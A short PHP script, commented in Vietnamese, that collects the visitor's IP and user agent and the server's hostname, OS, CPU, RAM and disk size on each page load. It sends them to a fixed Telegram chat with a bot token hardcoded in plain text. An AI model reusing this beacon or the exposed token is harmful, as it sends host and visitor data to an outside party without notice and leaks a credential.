<?php
// Khai báo token của bot
$botToken = '6756366058:AAGSDLDxRjM5sbPnEvPSHc1wypO7AyYtrW8';

// Hàm gửi thông tin về Telegram
function sendSystemInfoToTelegram($chatId) {
    global $botToken;

    // Lấy thông tin hệ thống
    $ipAddress = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    $os = php_uname('s');
    $cpu = php_uname('m');
    $ram = round(shell_exec('free -m | grep Mem | awk \'{print $2}\'') / 1024); // RAM in GB
    $disk = round(disk_total_space('/') / (1024 * 1024 * 1024), 2); // Disk in GB
    $gpu = 'N/A'; // Thông tin GPU có thể được mở rộng sau
    $hostname = gethostname();

    // Tạo nội dung thông tin
    $infoText = "Thông tin hệ thống:\n"
        . "- Tên máy chủ: $hostname\n"
        . "- Địa chỉ IP: $ipAddress\n"
        . "- User-Agent: $userAgent\n"
        . "- Hệ điều hành: $os\n"
        . "- CPU: $cpu\n"
        . "- RAM: $ram GB\n"
        . "- Disk: $disk GB\n"
        . "- GPU: $gpu";

    // Gửi thông tin về Telegram
    sendTextToTelegram($infoText, $chatId);
}

// Hàm gửi thông tin về Telegram
function sendTextToTelegram($text, $chatId) {
    global $botToken;
    $apiUrl = 'https://api.telegram.org/bot' . $botToken . '/sendMessage';

    $postData = [
        'chat_id' => $chatId,
        'text' => $text,
    ];

    $options = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-Type: application/x-www-form-urlencoded',
            'content' => http_build_query($postData),
        ],
    ];

    $context = stream_context_create($options);
    $result = file_get_contents($apiUrl, false, $context);

    // Xử lý kết quả nếu cần thiết
    // ...

    // Trả về thông báo thành công hoặc thất bại
    echo json_encode(['status' => 'success', 'message' => 'Text message sent successfully']);
}

// Gọi hàm gửi thông tin về Telegram
$chatId = '6399418466'; // Đặt ID của người nhận ở đây
sendSystemInfoToTelegram($chatId);
?>
